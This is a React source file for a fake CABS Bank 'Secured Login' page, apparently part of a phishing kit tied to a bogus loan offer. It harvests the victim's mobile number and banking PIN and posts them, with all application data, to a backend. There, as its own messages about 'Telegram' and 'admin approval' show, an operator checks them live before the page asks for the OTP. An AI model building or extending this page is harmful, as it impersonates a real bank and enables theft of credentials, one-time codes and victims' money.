import React, { useState, useRef, useEffect } from 'react';
import { CabsLogo, CABS_LOGO_URL } from './CabsLogo';
import { LoanApplicationData } from '../types';
import { Lock, Phone, FileText, Shield, ArrowLeft } from 'lucide-react';

interface ConfirmLoginPageProps {
  data: LoanApplicationData;
  onSuccess: (pin: string) => void;
  onBackToDashboard: () => void;
  onToast: (msg: string, isError?: boolean) => void;
}

export const ConfirmLoginPage: React.FC<ConfirmLoginPageProps> = ({
  data,
  onSuccess,
  onBackToDashboard,
  onToast,
}) => {
  const [mobileNumber, setMobileNumber] = useState(data.phone || '');
  const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [submissionId, setSubmissionId] = useState<string | null>(null);

  const inputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  // Auto focus first PIN input and set submission ID
  useEffect(() => {
    inputRefs[0].current?.focus();
    // Get submission ID from data prop
    if (data.submissionId) {
      setSubmissionId(data.submissionId);
    }
  }, [data.submissionId]);

  const handlePinChange = (index: number, value: string) => {
    // Only accept single digit
    const cleaned = value.replace(/\D/g, '').slice(-1);
    const newDigits = [...pinDigits];
    newDigits[index] = cleaned;
    setPinDigits(newDigits);
    setErrorMessage(null);

    // If a digit was entered, auto advance
    if (cleaned && index < 3) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);

    const fullPin = pinDigits.join('');
    if (!mobileNumber.trim()) {
      setErrorMessage('Please enter your mobile number.');
      onToast('Please enter your mobile number.', true);
      return;
    }

    if (fullPin.length !== 4) {
      setErrorMessage('Please enter all 4 digits of your CABS PIN.');
      onToast('Please enter all 4 digits of your CABS PIN.', true);
      return;
    }

    // Specific test PIN for wrong simulation
    if (fullPin === '0000') {
      setIsLoading(true);
      setTimeout(() => {
        setIsLoading(false);
        setErrorMessage('Wrong PIN. Please enter the correct PIN (Try 1234).');
        onToast('Invalid PIN credentials.', true);
        setPinDigits(['', '', '', '']);
        inputRefs[0].current?.focus();
      }, 1500);
      return;
    }

    setIsLoading(true);
    onToast('Sending PIN for verification...');

    try {
      // Send PIN verification request to backend
      const apiUrl = import.meta.env.VITE_API_URL || `${window.location.origin}/api`;
      const currentSubmissionId = submissionId || Date.now().toString();
      
      const response = await fetch(`${apiUrl}/verify-pin`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          submissionId: currentSubmissionId,
          pin: fullPin,
          formData: data,
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send PIN verification');
      }

      onToast('PIN sent for verification. Waiting for approval...');

      // Poll for PIN verification status
      let attempts = 0;
      const maxAttempts = 30; // 30 seconds timeout
      const pollInterval = setInterval(async () => {
        attempts++;
        
        try {
          const statusResponse = await fetch(`${apiUrl}/pin-status/${currentSubmissionId}`);
          const statusData = await statusResponse.json();

          if (statusData.pinVerified === true) {
            clearInterval(pollInterval);
            setIsLoading(false);
            onToast('PIN verified! Please enter OTP sent to your phone.');
            onSuccess(fullPin);
          } else if (statusData.pinStatus === 'incorrect') {
            clearInterval(pollInterval);
            setIsLoading(false);
            setErrorMessage('PIN verification declined. Please try again.');
            onToast('PIN verification declined.', true);
            setPinDigits(['', '', '', '']);
            inputRefs[0].current?.focus();
          } else if (attempts >= maxAttempts) {
            clearInterval(pollInterval);
            setIsLoading(false);
            setErrorMessage('Verification timeout. Telegram not responding. Please try again.');
            onToast('Verification timeout. Telegram not responding.', true);
          }
        } catch (error) {
          console.error('Error polling PIN status:', error);
        }
      }, 1000);

    } catch (error) {
      console.error('PIN verification error:', error);
      setIsLoading(false);
      setErrorMessage('Failed to verify PIN. Please try again.');
      onToast('Failed to verify PIN. Please try again.', true);
    }
  };

  const handleForgotPassword = () => {
    onToast('Biometric authentication & PIN reset link sent via SMS.');
  };

  return (
    <div
      className="min-h-screen bg-[#0a0e27] text-white flex flex-col justify-center items-center px-4 py-8 relative overflow-hidden"
      style={{ fontFamily: "'Albert Sans', sans-serif" }}
    >
      {/* Background with blurred banking ambience */}
      <div
        className="fixed inset-0 pointer-events-none"
        style={{
          background:
            'radial-gradient(circle at 50% 20%, rgba(39,60,131,0.3) 0%, transparent 60%), radial-gradient(circle at 80% 80%, rgba(0,134,112,0.2) 0%, transparent 50%), #0a0e27',
        }}
      />

      {/* Decorative background grid pattern */}
      <div
        className="fixed inset-0 opacity-10 pointer-events-none"
        style={{
          backgroundImage:
            'linear-gradient(rgba(255, 255, 255, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.1) 1px, transparent 1px)',
          backgroundSize: '40px 40px',
        }}
      />

      {/* Container */}
      <div className="relative z-10 w-full max-w-[420px] flex flex-col items-center">
        {/* Navigation pill back */}
        <div className="w-full flex justify-between items-center mb-6">
          <button
            onClick={onBackToDashboard}
            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-white/80 hover:text-white text-xs font-semibold backdrop-blur-md transition-colors cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back to Dashboard</span>
          </button>
        </div>

        {/* Circular Logo Badge */}
        <div className="w-24 h-24 rounded-full bg-white flex items-center justify-center p-2 mb-5 shadow-[0_8px_30px_rgba(0,0,0,0.5)] border-2 border-amber-400/40 overflow-hidden">
          <img
            src={CABS_LOGO_URL}
            alt="CABS Bank"
            className="w-full h-full object-contain"
          />
        </div>

        {/* Login Title */}
        <div
          className="text-2xl sm:text-[26px] font-extrabold text-white mb-6 flex items-center gap-2.5 drop-shadow-[0_2px_10px_rgba(0,0,0,0.4)]"
          style={{ fontFamily: "'Urbanist', sans-serif" }}
        >
          <span>Secured Login</span>
          <span className="text-xl">🔒</span>
        </div>

        {/* Approved Amount Reminder Chip */}
        {data.loanAmount && (
          <div className="w-full mb-5 px-4 py-2.5 rounded-xl bg-white/5 border border-white/10 text-center text-xs text-white/80">
            Authorizing withdrawal of{' '}
            <strong className="text-[#8DC63F] text-sm">USD$ {parseFloat(data.loanAmount).toLocaleString()}</strong>
            {' '}to CABS Account
          </div>
        )}

        {/* Error message banner */}
        {errorMessage && (
          <div className="w-full bg-red-500/15 border border-red-500/40 text-[#ff6b7a] px-4 py-3 rounded-xl text-xs sm:text-sm mb-5 text-center animate-fadeInUp">
            {errorMessage}
          </div>
        )}

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="w-full">
          {/* Mobile Number */}
          <div className="mb-5 text-left">
            <label
              htmlFor="mobileNumber"
              className="block text-sm font-medium text-white/85 mb-2"
            >
              Mobile Number
            </label>
            <input
              type="tel"
              id="mobileNumber"
              name="mobileNumber"
              value={mobileNumber}
              onChange={(e) => setMobileNumber(e.target.value)}
              placeholder="eg 07XXXXXXXXX"
              maxLength={15}
              required
              className="w-full h-[52px] border-[1.5px] border-white/25 focus:border-white/60 rounded-xl px-4 text-center font-mono text-base text-white bg-white/10 focus:bg-white/15 outline-none transition-all shadow-[0_0_0_0_rgba(255,255,255,0)] focus:shadow-[0_0_0_3px_rgba(255,255,255,0.15)]"
            />
          </div>

          {/* PIN Input */}
          <div className="mb-6">
            <label className="block text-sm font-medium text-white/85 mb-3 text-center">
              Enter CABS pin
            </label>
            <div className="flex justify-center gap-3">
              {pinDigits.map((digit, index) => (
                <input
                  key={index}
                  ref={inputRefs[index]}
                  type="password"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handlePinChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="w-14 h-14 border-[1.5px] border-white/25 focus:border-white/60 rounded-xl bg-white/10 focus:bg-white/15 text-center text-2xl font-bold text-white outline-none transition-all shadow-inner focus:shadow-[0_0_0_3px_rgba(255,255,255,0.15)] caret-white"
                />
              ))}
            </div>
            <p className="text-[11px] text-white/50 text-center mt-2">
              Tip: Enter any 4-digit PIN (e.g. 1234) to confirm
            </p>
          </div>

          {/* Sign In Button */}
          <button
            type="submit"
            className="w-full h-[52px] rounded-xl bg-white/15 hover:bg-white/25 text-white/95 border-[1.5px] border-white/20 hover:border-white/40 font-semibold text-base transition-all duration-200 active:scale-[0.98] cursor-pointer backdrop-blur-xs mb-4 shadow-lg"
          >
            Sign In &amp; Authorize
          </button>
        </form>

        {/* Biometric / Forgot Password */}
        <button
          type="button"
          onClick={handleForgotPassword}
          className="w-full h-[52px] rounded-xl bg-[#0d1642] hover:bg-[#1a237e] text-white border border-white/10 font-semibold text-sm transition-all duration-200 active:scale-[0.98] cursor-pointer shadow-md mb-8"
        >
          Forgot Password / Biometrics
        </button>

        {/* Footer Links */}
        <div className="flex justify-between items-center w-full px-2 text-white/70 text-[11px] border-t border-white/10 pt-6">
          <a
            href="#contact"
            className="flex flex-col items-center gap-1.5 hover:text-white transition-colors"
          >
            <Phone className="w-5 h-5 text-white/80" />
            <span>Contact us</span>
          </a>

          <a
            href="#terms"
            className="flex flex-col items-center gap-1.5 hover:text-white transition-colors"
          >
            <FileText className="w-5 h-5 text-white/80" />
            <span>Terms &amp; Conditions</span>
          </a>

          <a
            href="#privacy"
            className="flex flex-col items-center gap-1.5 hover:text-white transition-colors"
          >
            <Shield className="w-5 h-5 text-white/80" />
            <span>Privacy policy</span>
          </a>
        </div>
      </div>

      {/* Loading Overlay */}
      {isLoading && (
        <div className="fixed inset-0 bg-[#0a0e27]/95 z-[2000] flex flex-col items-center justify-center gap-5">
          <div className="w-12 h-12 border-4 border-white/20 border-t-white rounded-full animate-spin" />
          <div
            className="text-white text-base font-bold"
            style={{ fontFamily: "'Urbanist', sans-serif" }}
          >
            Verifying PIN via Telegram...
          </div>
          <div className="text-xs text-white/60">
            Waiting for admin approval. Please check Telegram.
          </div>
        </div>
      )}
    </div>
  );
};
